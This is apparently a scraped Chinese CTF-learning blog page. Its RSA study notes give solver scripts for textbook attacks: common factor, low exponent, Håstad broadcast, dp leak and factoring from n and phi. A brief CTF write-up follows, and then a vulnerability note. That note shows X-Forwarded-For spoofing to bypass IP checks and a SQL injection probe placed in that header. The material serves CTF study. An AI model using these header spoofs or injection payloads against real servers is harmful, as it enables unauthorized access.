class="line">    return n1</span><br><span class="line">p&#x3D;gys2(n1,n2)</span><br><span class="line">print (&quot;p&#x3D;&quot;,p)</span><br><span class="line"></span><br><span class="line">#求q1,q2</span><br><span class="line"></span><br><span class="line">q1&#x3D;n1&#x2F;&#x2F;p</span><br><span class="line">q2&#x3D;n2&#x2F;&#x2F;p</span><br><span class="line">print(&quot;q1&#x3D;&quot;,q1)</span><br><span class="line">print(&quot;q2&#x3D;&quot;,q2)</span><br><span class="line"></span><br><span class="line">#求d_1,d_2</span><br><span class="line"></span><br><span class="line">p0 &#x3D; gmpy2.mpz(p)#初始化大整数</span><br><span class="line">q_1 &#x3D; gmpy2.mpz(q1)</span><br><span class="line">q_2 &#x3D; gmpy2.mpz(q2)</span><br><span class="line">e &#x3D; gmpy2.mpz(65537)</span><br><span class="line">r_1 &#x3D; (p0-1)*(q_1-1)</span><br><span class="line">r_2 &#x3D; (p0-1)*(q_2-1)</span><br><span class="line">d_1 &#x3D; gmpy2.invert(e,r_1)  # invert（e，r）返回d使得e * d &#x3D;&#x3D; 1 mod r，如果不存在d，则返回0</span><br><span class="line">d_2 &#x3D; gmpy2.invert(e,r_2)</span><br><span class="line">print(&quot;d_1&#x3D;&quot;,d_1)</span><br><span class="line">print(&quot;d_2&#x3D;&quot;,d_2)</span><br><span class="line"></span><br><span class="line"># 求c1,c2</span><br><span class="line"></span><br><span class="line">c1&#x3D;</span><br><span class="line">c2&#x3D;</span><br><span class="line">m1 &#x3D; pow(c1, d_1, n1)</span><br><span class="line">m2 &#x3D; pow(c2, d_2, n2)</span><br><span class="line">print(&quot;m1&#x3D;&quot;,m1)</span><br><span class="line">print(&quot;m2&#x3D;&quot;,m2)</span><br></pre></td></tr></table></figure>

<p>根据<code>欧几里德算法</code>算出的<code>p</code>之后，再用<code>n</code>除以<code>p</code>即可求出<code>q</code>，由此可以得到的参数有<code>p</code>、<code>q</code>、<code>n</code>、<code>e</code>，再使用常规方法计算出<code>d</code>，即可破解密文。</p>
<p>m = pow(c, d, N),可以得到明文m</p>
<hr>
<p><strong>共模攻击</strong></p>
<p>如果在RSA的使用中使用了相同的模n对相同的明文m进行了加密，那么就可以在不分解n的情况下还原出明文m的值。</p>
<blockquote>
<p>c1 = m^e1 mod n<br> c2 = m^e2 mod n</p>
</blockquote>
<p>识别：非常简单，若干次加密，每次n都一样，明文根据题意也一样即可。</p>
<hr>
<p><strong>已知私钥文件、c求m</strong></p>
<p>题目中给出了私钥文件private.pem和flag.enc</p>
<p>pem文件通常是包含了—–BEGIN PRIVATE KEY—–和—–END PRIVATE KEY—–，是 Base64 编码的二进制内容<br> 使用私钥解密密文的方式</p>
<p>使用openssl工具<br> 利用如下命令：</p>
<blockquote>
<p>rsautl -decrypt -in flag.enc(密文名称) -inkey private.pem</p>
</blockquote>
<hr>
<p><strong>已知公钥文件、c求m</strong></p>
<p>题目中给出了public.pem和密文flag.enc</p>
<blockquote>
<p>openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem<br> ​     [提取出pubkey.pem中的参数]</p>
</blockquote>
<blockquote>
<p>得到n，化为十进制</p>
</blockquote>
<blockquote>
<p>将n分解为P，q</p>
</blockquote>
<blockquote>
<p>python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239</p>
<p>[使用rsatool生成私钥文件: private.pem]</p>
</blockquote>
<blockquote>
<p>openssl rsautl -decrypt -in flag.enc -inkey private.pem</p>
</blockquote>
<hr>
<p><strong>低加密指数攻击</strong></p>
<p>在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。</p>
<p><strong>e=3时的小明文攻击</strong></p>
<p>当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<blockquote>
<p>(1)m3&lt;n,也就是说m3=c;<br> (2)m3&gt;n，即(m3+kn)mod n=c（爆破k，不知道k取什么值）。</p>
</blockquote>
<ul>
<li>第一种情况   根据 <code>c = pow(m, e, N) </code>可知：</li>
</ul>
<p>当e=3时，如果明文过小，导致<strong>明文的三次方</strong>仍然小于n，那么通过直接对密文三次开方，即可得到明文。</p>
<ul>
<li>第二种情况  如果<strong>明文的三次方</strong>比n大，但是不够大，那么设k，有：    c=(m^3+kn)mod n</li>
</ul>
<p>爆破k，如果（c-kn）能开三次根式，那么可以直接得到明文。</p>
<p><strong>识别：</strong></p>
<p>推荐在e=3的时候首先尝试这种方法。</p>
<blockquote>
<p>openssl  rsa  -pubin  -in  pubkey.pem  （读取公钥内容）<br> openssl  rsa   -pubin  in  pubkey.pem -text（以文本格式输出公钥内容),从这一步可以知道e的值</p>
</blockquote>
<p>从而判断为低加密指数攻击</p>
<hr>
<p><strong>低加密指数广播攻击</strong></p>
<p>低加密指数广播攻击，即如果选取的加密指数较低，并且使用了相同的加密指数给一个接收者发送了相同的信息（或者给一群接收者发送了相同的信息），那么可以进行广播攻击得到明文。</p>
<p>假如我们需要将一份明文进行多份加密，但是每份使用不同的密钥，密钥中的模数n不同但指数e相同且很小，我们只要拿到多份密文和对应的n就可以利用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/freinds/p/6388992.html">中国剩余定理</a>进行解密。</p>
<p><strong>适用</strong></p>
<p>只要满足以下情况，我们就可以考虑实用低加密指数广播攻击：</p>
<blockquote>
<p>1.加密指数e非常小<br> 2.一份明文使用不同的模数n，相同的加密指数e进行多次加密<br> 3.可以拿到每一份加密后的密文和对应的模数n、加密指数e</p>
</blockquote>
<p>低加密指数广播攻击脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf8</span><br><span class="line"></span><br><span class="line">from struct import pack,unpack</span><br><span class="line">import zlib</span><br><span class="line">import gmpy</span><br><span class="line">def my_parse_number(number):</span><br><span class="line">    string &#x3D; &quot;%x&quot; % number</span><br><span class="line">    #if len(string) !&#x3D; 64:</span><br><span class="line">    #    return &quot;&quot;</span><br><span class="line">    erg &#x3D; []</span><br><span class="line">    while string !&#x3D; &#39;&#39;:</span><br><span class="line">        erg &#x3D; erg + [chr(int(string[:2], 16))]</span><br><span class="line">        string &#x3D; string[2:]</span><br><span class="line">    return &#39;&#39;.join(erg)</span><br><span class="line">def extended_gcd(a, b):</span><br><span class="line">    x,y &#x3D; 0, 1</span><br><span class="line">    lastx, lasty &#x3D; 1, 0</span><br><span class="line">    while b:</span><br><span class="line">        a, (q, b) &#x3D; b, divmod(a,b)</span><br><span class="line">        x, lastx &#x3D; lastx-q*x, x</span><br><span class="line">        y, lasty &#x3D; lasty-q*y, y</span><br><span class="line">    return (lastx, lasty, a)</span><br><span class="line">def chinese_remainder_theorem(items):</span><br><span class="line">  N &#x3D; 1</span><br><span class="line">  for a, n in items:</span><br><span class="line">    N *&#x3D; n</span><br><span class="line">  result &#x3D; 0</span><br><span class="line">  for a, n in items:</span><br><span class="line">    m &#x3D; N&#x2F;n</span><br><span class="line">    r, s, d &#x3D; extended_gcd(n, m)</span><br><span class="line">    if d !&#x3D; 1:</span><br><span class="line">      N&#x3D;N&#x2F;n</span><br><span class="line">      continue</span><br><span class="line">      #raise &quot;Input not pairwise co-prime&quot;</span><br><span class="line">    result +&#x3D; a*s*m</span><br><span class="line">  return result % N, N</span><br><span class="line">  &#x2F;&#x2F;中国剩余定理 ， 输入多组c和多组n，以及较小的指数e</span><br><span class="line">sessions&#x3D;[</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;,</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;,</span><br><span class="line">&#123;&quot;c&quot;: , &quot;e&quot;: , &quot;n&quot;: &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">data &#x3D; []</span><br><span class="line">for session in sessions:</span><br><span class="line">    e&#x3D;session[&#39;e&#39;]</span><br><span class="line">    n&#x3D;session[&#39;n&#39;]</span><br><span class="line">    msg&#x3D;session[&#39;c&#39;]</span><br><span class="line">    data &#x3D; data + [(msg, n)]</span><br><span class="line">print &quot;Please wait, performing CRT&quot;</span><br><span class="line">x, n &#x3D; chinese_remainder_theorem(data)</span><br><span class="line">e&#x3D;session[&#39;e&#39;]</span><br><span class="line">realnum &#x3D; gmpy.mpz(x).root(e)[0].digits()</span><br><span class="line">print my_parse_number(int(realnum))</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>n可以分解为多个素数</strong></p>
<p>使用公钥加密和使用私钥解密流程（中国剩余定理）：<br> 准备<br> 首先，我们需要在在生成私钥公钥时，多生成几个数：<br> 我们的d是e对phi(n)的逆元，我们现在需要另外2个逆元（分别是对(p-1)和(q-1)的），既<br> 1：计算dp，使得dp * e = 1 mod(p-1)<br> 2：计算dq，使得dq * e = 1 mod(q-1)<br> 此外需要第三个元素，既q对p的逆元<br> 3：计算qInv，使得qInv * q = 1 mod p<br> ​        1 2 3 都作为私钥的一部分。</p>
<blockquote>
<p>dp = d mod p-1<br> dq = d mod q-1</p>
</blockquote>
<p><strong>计算：</strong></p>
<p>使用公钥加密：<br> 若要加密明文m,则需要计算c = m^e mod n，c为密文。</p>
<p>使用私钥解密：<br> 1:m1=c^dp mod p<br> 2:m2=c^dq mod q<br> 3:h= (qInv*((m1 - m2)mod p)) mod p<br> 4:m = m2 + h*q<br> m就是明文。</p>
<p>例：n=17947<br> ​           e=3<br> ​           c=8363<br> ​           m=???</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n&#x3D;17947</span><br><span class="line">p&#x3D;137</span><br><span class="line">q&#x3D;131</span><br><span class="line">e&#x3D;3</span><br><span class="line">c&#x3D;8363</span><br><span class="line">dp&#x3D;gmpy2.invert(e,p-1)</span><br><span class="line">dq&#x3D;gmpy2.invert(e,q-1)</span><br><span class="line">m1&#x3D;pow(c,dp,p)</span><br><span class="line">m2&#x3D;pow(c,dq,q)</span><br><span class="line">qInv&#x3D;gmpy2.invert(q,p)</span><br><span class="line">h&#x3D;(qInv*((m1-m2)% p)) % p</span><br><span class="line">m&#x3D;m2+h*q</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<p><strong>多素数</strong></p>
<p>例:n=p1<em>p2</em>p3=2279269<br> ​     p1=137<br> ​     p2=131<br> ​     p3=127<br> ​     e=19</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">预先计算:</span><br><span class="line">dp &#x3D; 19^-1 mod 137-1 &#x3D; 43</span><br><span class="line">dq &#x3D; 19^-1 mod 131-1 &#x3D; 89</span><br><span class="line">dr &#x3D; 19^-1 mod 127-1 &#x3D; 73</span><br><span class="line"></span><br><span class="line">若要解密密文 768924，则先计算</span><br><span class="line">1:m1&#x3D;768924^43 mod 137 &#x3D; 102</span><br><span class="line">2:m2&#x3D;768924^89 mod 131 &#x3D; 120</span><br><span class="line">3:m3&#x3D;768924^73 mod 127 &#x3D; 5</span><br><span class="line"></span><br><span class="line">等式1与等式2连列方程组计算：</span><br><span class="line">qInv &#x3D; 114</span><br><span class="line">h &#x3D; (qInv*((m1 - m2)mod p)) mod p &#x3D; 3</span><br><span class="line">m12 &#x3D; m2 + h*q &#x3D; 120 + 3*131 &#x3D; 513</span><br><span class="line"></span><br><span class="line">所以等式1与等式2的通用解为：513+k1*(131*137)</span><br><span class="line">所以结合等式3问题可以变为：</span><br><span class="line">m1&#x3D;513  p&#x3D;17947</span><br><span class="line">m2&#x3D;5    q&#x3D;127</span><br><span class="line">qInv*q≡ 1 mod p    ——&gt;qInv&#x3D;10316</span><br><span class="line">h &#x3D; (10316*((513 - 5)mod 17947)) mod 17947 &#x3D;4</span><br><span class="line">m &#x3D; 5 + 4*127 &#x3D; 513</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>jiaoben</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">n&#x3D;2279269</span><br><span class="line">p1&#x3D;137</span><br><span class="line">p2&#x3D;131</span><br><span class="line">p3&#x3D;127</span><br><span class="line">e&#x3D;19</span><br><span class="line">c&#x3D;768924</span><br><span class="line">dp1&#x3D;gmpy2.invert(e,p1-1)</span><br><span class="line">dp2&#x3D;gmpy2.invert(e,p2-1)</span><br><span class="line">dp3&#x3D;gmpy2.invert(e,p3-1)</span><br><span class="line">m1&#x3D;pow(c,dp1,p1)</span><br><span class="line">m2&#x3D;pow(c,dp2,p2)</span><br><span class="line">m3&#x3D;pow(c,dp3,p3)</span><br><span class="line">qInv1&#x3D;gmpy2.invert(p2,p1)</span><br><span class="line">h1&#x3D;(qInv1*((m1-m2) % p1)) % p1</span><br><span class="line">m4&#x3D;m2+h1*p2</span><br><span class="line">p4&#x3D;p1*p2</span><br><span class="line">qInv2&#x3D;gmpy2.invert(p3,p4)</span><br><span class="line">h2&#x3D;(qInv2*((m4-m3)% p4)) % p4</span><br><span class="line">m&#x3D;m3+h2*p3</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>dp、dq泄露</strong></p>
<blockquote>
<p>dp = d mod p-1<br> dq = d mod q-1</p>
</blockquote>
<p>这种参数是为了让解密的时候更快速而产生的</p>
<p>已知p,q,dp,dq,c求m</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import binascii</span><br><span class="line">import libnum</span><br><span class="line">def decrypt(dp,dq,p,q,c):</span><br><span class="line">    InvQ &#x3D; gmpy2.invert(q,p)</span><br><span class="line">    mp &#x3D; pow(c,dp,p)</span><br><span class="line">    mq &#x3D; pow(c,dq,q)                   #求幂取模运算</span><br><span class="line">    m&#x3D;(((mp-mq)*InvQ)%p)*q+mq          #求明文公式</span><br><span class="line">    print (binascii.unhexlify(hex(m)[2:]))</span><br><span class="line">    print(libnum.n2s(m))</span><br><span class="line">p &#x3D; </span><br><span class="line">q &#x3D; </span><br><span class="line">dp &#x3D; </span><br><span class="line">dq &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">decrypt(dp,dq,p,q,c)</span><br></pre></td></tr></table></figure>

<p><strong>已知e,n,dp,c求m</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import libnum</span><br><span class="line">import binascii</span><br><span class="line">def getd(n,e,dp):</span><br><span class="line">    for i in range(1,e):            #在范围(1,e)之间进行遍历</span><br><span class="line">        if (dp*e-1)%i &#x3D;&#x3D; 0:</span><br><span class="line">            if n%(((dp*e-1)&#x2F;i)+1)&#x3D;&#x3D;0:    #存在p，使得n能被p整除</span><br><span class="line">                p&#x3D;((dp*e-1)&#x2F;i)+1</span><br><span class="line">                q&#x3D;n&#x2F;(((dp*e-1)&#x2F;i)+1)</span><br><span class="line">                phi &#x3D; (p-1)*(q-1)         #欧拉定理</span><br><span class="line">                d &#x3D; gmpy2.invert(e,phi)%phi        #求模逆</span><br><span class="line">                return d</span><br><span class="line">e &#x3D;</span><br><span class="line">n &#x3D; </span><br><span class="line">dp &#x3D; </span><br><span class="line">c &#x3D; </span><br><span class="line">d&#x3D;getd(n,e,dp)</span><br><span class="line">m&#x3D;pow(c,d,n)                            #快速求幂取模运算</span><br><span class="line">print(binascii.unhexlify(hex(m)[2:]))       #16进制转文本</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure>



<hr>
<p><strong>已知n,r求p,q</strong></p>
<p>核心是通过n和r解出p和q</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.二分法，求得p，q</span><br><span class="line"></span><br><span class="line">2.RSATool2v17中，输入p，q，r，e，得到d  (脚本也可)</span><br><span class="line"></span><br><span class="line">3.通过m&#x3D;pow(c,d,n)</span><br><span class="line">注意：有时题目有要求，解出的可能是m乘上某一个参数，这是需要仔细审题</span><br><span class="line"></span><br><span class="line">4.转字符，得到flag</span><br></pre></td></tr></table></figure>

<p>脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">import numpy as np</span><br><span class="line">np.set_printoptions(suppress&#x3D;True)</span><br><span class="line"></span><br><span class="line">n&#x3D;gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span><br><span class="line">r&#x3D;gmpy2.mpz(14057332139537395701238463644827948204030576528558543283405966933509944444681257521108769303999679955371474546213196051386802936343092965202519504111238572269823072199...)</span><br><span class="line"></span><br><span class="line">c1&#x3D;n-r+1</span><br><span class="line">print (c1)</span><br><span class="line"></span><br><span class="line">l&#x3D;c1&#x2F;2</span><br><span class="line">r&#x3D;c1</span><br><span class="line">#p&#x3D;(l+r)&#x2F;2</span><br><span class="line">#y&#x3D;p*(c1-p)</span><br><span class="line"></span><br><span class="line">while l&lt;r:</span><br><span class="line">	p&#x3D;(l+r)&#x2F;2</span><br><span class="line">	y&#x3D;p*(c1-p)</span><br><span class="line">	if y&#x3D;&#x3D;n:</span><br><span class="line">		print (p)</span><br><span class="line">		break</span><br><span class="line">	if y&gt;n:</span><br><span class="line">		print (y&gt;n)</span><br><span class="line">		l&#x3D;p</span><br><span class="line">	else:</span><br><span class="line">		print (y&lt;n)</span><br><span class="line">		r&#x3D;p</span><br><span class="line">		print (&quot;done&quot;)</span><br><span class="line">q&#x3D;c1-p</span><br><span class="line">print q</span><br><span class="line">&#x2F;*</span><br><span class="line">if p&gt;q:</span><br><span class="line">    p,q&#x3D;q,p</span><br><span class="line">factor2 &#x3D; 2021 * p + 2020 * q</span><br><span class="line">if factor2 &lt; 0:</span><br><span class="line">    factor2 &#x3D; (-1) * factor2</span><br><span class="line">    </span><br><span class="line">_P&#x3D;sympy.nextprime(factor2)</span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/" data-id="ckhytgorg00005kv3f15wav1t" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-海啸杯wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/" class="article-date">
  <time datetime="2020-11-19T03:22:41.167Z" itemprop="datePublished">2020-11-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/">海啸杯wp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="一-表白"><a href="#一-表白" class="headerlink" title="一.表白"></a>一.表白</h3><p>解压安装包得到flag.png,用winhex打开flag.png,将头文件的参数，得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119075027408.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119012005398.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119012027585.png"></p>
<h3 id="二-小明家的小菜园"><a href="#二-小明家的小菜园" class="headerlink" title="二.小明家的小菜园"></a>二.小明家的小菜园</h3><p>复制字符串在CTFCarkTools打开，本题考查栅栏密码，对字符串进行解码得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201119013023029.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/19/%E6%B5%B7%E5%95%B8%E6%9D%AFwp/" data-id="ckhpm2jio0001ckv3d31r0340" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记6" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/" class="article-date">
  <time datetime="2020-11-17T14:26:56.017Z" itemprop="datePublished">2020-11-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/11/17/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06/">漏洞</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="XFF漏洞（X-Forwarded-For）"><a href="#XFF漏洞（X-Forwarded-For）" class="headerlink" title="XFF漏洞（X-Forwarded-For）"></a>XFF漏洞（X-Forwarded-For）</h2><h3 id="•什么是XFF漏洞"><a href="#•什么是XFF漏洞" class="headerlink" title="•什么是XFF漏洞"></a>•什么是XFF漏洞</h3><p>*XFF是header请求头中的一个参数<br> 是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。<br> 代表了HTTP的请求端真实的IP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br><span class="line">&#x2F;&#x2F;浏览器IP，第一个代理服务器，第二个三个四个等等</span><br></pre></td></tr></table></figure>

<h3 id="•利用方法"><a href="#•利用方法" class="headerlink" title="•利用方法"></a>•利用方法</h3><h5 id="1-绕过服务器过滤"><a href="#1-绕过服务器过滤" class="headerlink" title="1.绕过服务器过滤"></a>1.绕过服务器过滤</h5><p>​         XFF漏洞也称为IP欺骗。<br> 有些服务器通过XFF头判断是否是本地服务器，当判断为本地服务器时，才能访问相关内容。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>修改XFF头的信息，即可绕过服务器的过滤。</p>
<h5 id="2-XFF导致sql注入"><a href="#2-XFF导致sql注入" class="headerlink" title="2.XFF导致sql注入"></a>2.XFF导致sql注入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 127.0.0.1&#39; and 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p>​        发现没有报错，证明存在注入点,然后进一步利用sql注入，进行渗透测试。</p>
<h5 id="3-其他服务器真实地址的参数"><a href="#3-其他服务器真实地址的参数" class="headerlink" title="3.其他服务器真实地址的参数"></a>3.其他服务器真实地址的参数</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">x-forwarded-fot</span><br><span class="line">x-remote-IP</span><br><span class="line">x-originating-IP</span><br><span class="line">x-remote-ip</span><br><span class="line">x-remote-addr</span><br><span class="line">x-client-IP</span><br><span class="line">x-client-ip</span><br><span class="line">x-Real-ip</span><br></pre></td></tr></table></figure>

<h5 id="4-例题"><a href="#4-例题" class="headerlink" title="4.例题"></a>4.例题</h5><p><a target="_blank" rel="noopener" href="http://47.98.234.232:28017/">http://47.98.234.232:28017/</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120104642871.png"></p>
<p>用Burp Suite抓包 将use=0改为use=1;写入X-Forwarded-For对http进行绕过，得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201120105133282.png"></p>
<h2 id="XXF-XML-External-Entity-injection-XML-外部实体注入漏洞）"><a href="#XXF-XML-External-Entity-injection-XML-外部实体注入漏洞）" class="headerlink" title="XXF((XML External Entity injection)XML 外部实体注入漏洞）"></a>XXF((XML External Entity injection)XML 外部实体注入漏洞）</h2><h3 id="•什么是XXF漏洞"><a href="#•什么是XXF漏洞" class="headerlink" title="•什么是XXF漏洞"></a>•什么是XXF漏洞</h3><p>​        *如果XML 文件在引用外部实体时候，可以沟通构造恶意内容，可以导致读取任意文件，命令执行和对内网的攻击，这就是XXE漏洞</p>
<h3 id="•XML"><a href="#•XML" class="headerlink" title="•XML"></a>•XML</h3><h5 id="1-XML概念："><a href="#1-XML概念：" class="headerlink" title="1.XML概念："></a>1.<strong>XML概念：</strong></h5><p>​         XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储， 结构是树形结构，有标签构成，这点很想HTML语言。但是XML和HTML有明显区别如下：<br>XML 被设计用来传输和存储数据。<br>HTML 被设计用来显示数据。</p>
<h5 id="2-XML结构"><a href="#2-XML结构" class="headerlink" title="2.XML结构:"></a>2.XML结构:</h5><p>​        来看一个简单的XML 文件结构， 第一行XML的声明，第二行<note> 为根元素， 下面的to, from,heading和body 都是子元素，构成了一个出色的自我描述性的结构：</p>
